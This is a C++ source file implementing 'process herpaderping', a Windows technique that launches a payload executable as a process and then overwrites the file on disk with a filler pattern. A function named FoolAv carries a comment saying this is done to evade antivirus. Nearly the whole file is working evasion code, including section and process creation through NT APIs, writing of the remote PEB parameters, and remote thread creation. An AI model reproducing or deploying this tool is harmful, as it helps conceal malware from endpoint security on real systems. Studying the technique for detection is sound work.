// Author:  Nikj
// File:    Herpaderping.cpp

#include "pch.hpp"
#include "utilitaire.hpp"

constexpr static std::array<uint8_t, 22> Pattern{ '\x68', '\x65', '\x72', '\x70', '\x61', '\x64',
    '\x65', '\x72', '\x70', '\x69','\x6e', '\x67', '\x20', '\x69', '\x73', '\x20', '\x63', '\x6f', 
    '\x6f', '\x6f', '\x6f', '\x6c'
}; // herpaderping is cool


class Herpaderping
{
public:
    void start(std::wstring pPayloadFile, std::wstring pTargetFile) 
    {
        std::cout << "\nAuthor: Nikj" << std::endl;
        std::cout << "Starting Herpaderping ..." << std::endl;

        //static std::wstring PayloadFile = pPayloadFile;
        //static std::wstring TargetFile = pTargetFile;
      
        Herpaderping::ReadPayload(pPayloadFile);
        Herpaderping::CreateTarget(pTargetFile);
        Herpaderping::WritePayloadToTarget(pPayloadFile, pTargetFile);
        Herpaderping::FoolAv();
        Herpaderping::CreatePayloadThreadFromTarget(pTargetFile);
    }
private:
    wil::unique_handle hProcess;
    wil::unique_handle hProcessPayload;
    wil::unique_handle hProcessTarget;
    uint32_t imageEntryPointRva = 0;
 
    HRESULT ReadPayload(std::wstring PayloadFile) {
        hProcessPayload.reset(CreateFileW(PayloadFile.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        ));
        
        if (!hProcessPayload.is_valid())
        {
            std::cerr << "[!] - Failed to open the payload file" << std::endl;
        }

        return S_OK;
    }

    HRESULT CreateTarget(std::wstring TargetFile) {
        hProcessTarget.reset(CreateFileW(TargetFile.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        ));
                                    
        if (!hProcessTarget.is_valid())
        {
            std::cerr << "[!] Failed to create the target file" << std::endl;
        }

        return S_OK;
    }

    HRESULT WritePayloadToTarget(std::wstring PayloadFile, std::wstring TargetFile)
        {
            HRESULT HR = Utilitaire::CopyFileByHandle(hProcessPayload.get(), hProcessTarget.get());
            RETURN_IF_FAILED(HR);
                
            std::wcout << "[+] Copy " << PayloadFile << " to " << TargetFile << std::endl;
                
            // Free the payload process handle
            hProcessPayload.reset();
                 
            // Create Sections and the process of the target
            wil::unique_handle hSection;
                    
            auto status = NtCreateSection(&hSection,
                SECTION_ALL_ACCESS,
                nullptr,
                nullptr,
                PAGE_READONLY,
                SEC_IMAGE,
                hProcessTarget.get()
            );
                
            status = NtCreateProcessEx(&hProcess, 
                PROCESS_ALL_ACCESS, 
                nullptr, 
                NtCurrentProcess(), 
                PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                hSection.get(), 
                nullptr, 
                nullptr, 
                0
            ); //Create a process with the section created above
                
            if (!NT_SUCCESS(status)) 
            {
                std::cerr << "[!] Unable to create process";
            }
            std::cout << "[+] Created process object, PID: " << GetProcessId(hProcess.get()) << std::endl;
                
            // Free the handle section, we don't need anymore
            hSection.reset();
            
            // Get the RVA for the CreateThread
            HR = Utilitaire::GetImageEntryPointRva(hProcessTarget.get(), imageEntryPointRva);
            if (FAILED(HR))
            {
                std::cerr << "[!] Failed to get the RVA of the target process" << std::endl;
                RETURN_HR(HR);
            }

            std::cout << "[+] Located target image entry RVA 0x" << imageEntryPointRva << std::endl;

            return S_OK;
        }
        
    HRESULT FoolAv()
    {
        // We overwrite the contents of the target file on disk to fool AV
        std::cout << "[+] Overwriting target with random pattern" << std::endl;
        
        HRESULT HR = Utilitaire::OverwriteFileContentsWithPattern(
            hProcessTarget.get(),
            Pattern,
            true // Flush File
        );
        
        if (FAILED(HR))
        {
            std::cerr << "[!] Failed to write pattern over file" << std::endl;
            RETURN_HR(HR);
        }
      
        return S_OK;
    }
        
    HRESULT CreatePayloadThreadFromTarget(std::wstring TargetFile)
    {
        // We prepare the Target Process Thread to be executed
        std::cout << "[+] Preparing target for execution" << std::endl;

        PROCESS_BASIC_INFORMATION pbi{};
        auto status = NtQueryInformationProcess(hProcess.get(),
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            nullptr
        );
        if (!NT_SUCCESS(status))
        {
            std::cerr << "[!] Failed to query process information" << std::endl;
        }
        
        PEB peb{};
        if (!ReadProcessMemory(hProcess.get(),
            pbi.PebBaseAddress,
            &peb,
            sizeof(peb),
            nullptr))
        {
            std::cerr << "[!] Failed to read remote process PEB" << std::endl;
            exit(-1);
        }
        
        std::cout << "[+] Writing process parameters, remote PEB ProcessParameters " << Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)) << std::endl;
        
        HRESULT HR = Utilitaire::WriteRemoteProcessParameters(
            hProcess.get(),
            TargetFile,
            std::nullopt,
            std::nullopt,
            (L"\"" + TargetFile + L"\""),
            NtCurrentPeb()->ProcessParameters->Environment,
            TargetFile,
            L"WinSta0\\Default",
            std::nullopt,
            std::nullopt
        );
        RETURN_IF_FAILED(HR);
        
        hProcessTarget.reset();
        
        void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);
        
        // We execute the tread 
        wil::unique_handle threadHandle;
        status = NtCreateThreadEx(&threadHandle,
            THREAD_ALL_ACCESS,
            nullptr,
            hProcess.get(),
            remoteEntryPoint,
            nullptr,
            0,
            0,
            0,
            0,
            nullptr
        );  
        if (!NT_SUCCESS(status))    
        {
            threadHandle.release();
            std::cerr << "[!] Failed to create remote thread" << std::endl;
            RETURN_NTSTATUS(status);
        }
        
        std::cout << "[+] Created thread, TID:" << GetThreadId(threadHandle.get()) << std::endl;
        
        // Process target spawned, we wait for the exit to leave the program
        std::cout << "[+] Waiting for herpaderped process to exit" << std::endl;
        
        WaitForSingleObject(hProcess.get(), INFINITE);
        
        DWORD targetExitCode = 0;
        GetExitCodeProcess(hProcess.get(), &targetExitCode);
        
        std::cout << "[+] Herpaderped process exited with code 0x" << targetExitCode << std::endl;
        
        return S_OK;
    }
};

int wmain(int argc, wchar_t *argv[])
{
    if (argc < 3)
    {
        std::cerr << "Invalid number of parameters" << std::endl;
        std::wcerr << "Usage: " << argv[0] << " PayloadFile TargetFile" << std::endl;
    }
    else 
    {
        std::wstring pPayloadFile = argv[1];
        std::wstring pTargetFile = argv[2];

        Herpaderping herpaderping;
        herpaderping.start(pPayloadFile, pTargetFile);
    }
    return 0;
}